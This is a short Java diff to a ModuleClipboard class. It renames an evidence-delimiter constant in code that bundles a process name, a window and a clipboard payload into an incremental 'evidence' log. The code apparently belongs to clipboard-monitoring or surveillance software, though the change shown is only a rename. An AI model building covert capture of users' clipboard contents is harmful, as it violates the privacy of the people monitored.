@@ -81,7 +81,7 @@ public class ModuleClipboard extends BaseModule implements IncrementalLog {
 		items.add(process);
 		items.add(window);
 		items.add(payload);
-		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+		items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
